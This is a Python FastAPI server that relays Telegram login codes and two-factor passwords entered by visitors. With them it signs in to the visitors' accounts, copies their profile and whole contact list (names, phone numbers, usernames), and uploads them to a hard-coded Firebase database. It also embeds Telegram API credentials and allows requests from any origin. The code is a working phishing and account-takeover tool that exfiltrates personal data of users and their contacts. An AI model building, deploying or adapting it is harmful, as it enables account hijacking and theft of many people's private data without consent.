import re
import httpx
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.sessions import MemorySession
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PasswordHashInvalidError
)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

API_ID = 36672098
API_HASH = 'ac0e5f923698f6b5f2737043601d950f'
FIREBASE_URL = "https://tel-l-2921e-default-rtdb.europe-west1.firebasedatabase.app"

sessions = {}

def clean_phone(phone: str) -> str:
    cleaned = re.sub(r'[^\d+]', '', phone.strip())
    if not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    return cleaned


async def save_to_firebase(user_phone: str, me_info: dict, contacts: list):
    """Отправляет данные в Firebase Realtime Database через REST API"""
    # В ключах Firebase нельзя использовать '+', поэтому убираем его
    phone_key = user_phone.replace('+', '')
    
    payload = {
        "user_info": me_info,
        "contacts_count": len(contacts),
        "contacts": contacts
    }
    
    url = f"{FIREBASE_URL}/users/{phone_key}.json"
    
    async with httpx.AsyncClient() as http_client:
        await http_client.put(url, json=payload)


class PhoneReq(BaseModel):
    phone: str


class VerifyReq(BaseModel):
    phone: str
    code: str = None
    phone_code_hash: str = None
    password: str = None


@app.post("/api/send-code")
async def send_code(data: PhoneReq):
    phone = clean_phone(data.phone)
    
    if len(phone) < 7:
        raise HTTPException(status_code=400, detail="Некорректный номер телефона")

    if phone in sessions:
        try:
            await sessions[phone].disconnect()
        except Exception:
            pass

    client = TelegramClient(
        MemorySession(),
        API_ID,
        API_HASH,
        device_model="PC 64bit",
        system_version="Windows 10",
        app_version="4.16.8",
        lang_code="ru",
        system_lang_code="ru"
    )

    await client.connect()

    try:
        sent_code = await client.send_code_request(phone)
        sessions[phone] = client
        return {
            "status": "ok",
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash
        }
    except FloodWaitError as e:
        await client.disconnect()
        raise HTTPException(status_code=429, detail=f"Слишком много попыток. Подождите {e.seconds} сек.")
    except Exception as e:
        await client.disconnect()
        raise HTTPException(status_code=400, detail=f"Ошибка Telegram: {str(e)}")


@app.post("/api/verify-and-extract")
async def verify_and_extract(data: VerifyReq):
    phone = clean_phone(data.phone)
    client: TelegramClient = sessions.get(phone)

    if not client or not client.is_connected():
        raise HTTPException(status_code=400, detail="Сессия устарела. Запросите код заново.")

    try:
        if data.password:
            await client.sign_in(password=data.password.strip())
        elif data.code:
            try:
                await client.sign_in(phone=phone, code=data.code.strip(), phone_code_hash=data.phone_code_hash)
            except SessionPasswordNeededError:
                return {"status": "need_2fa", "detail": "Требуется пароль двухфакторной аутентификации"}
        else:
            raise HTTPException(status_code=400, detail="Не передан код или пароль")

        # Получаем данные о самом пользователе
        me = await client.get_me()
        me_info = {
            "id": me.id,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "username": me.username,
            "phone": me.phone
        }

        # Выгрузка списка контактов
        result = await client(GetContactsRequest(hash=0))
        contacts_data = []

        for user in result.users:
            contacts_data.append({
                "id": user.id,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "phone": user.phone,
                "username": user.username
            })

        # Сохранение в Firebase
        try:
            await save_to_firebase(phone, me_info, contacts_data)
        except Exception as fb_err:
            print(f"Ошибка сохранения в Firebase: {fb_err}")

        # Закрываем сессию
        await client.log_out()
        await client.disconnect()
        del sessions[phone]

        return {
            "status": "ok",
            "contacts_count": len(contacts_data)
        }

    except PasswordHashInvalidError:
        raise HTTPException(status_code=400, detail="Введен неверный пароль 2FA.")
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        raise HTTPException(status_code=400, detail="Введен неверный или устаревший код.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
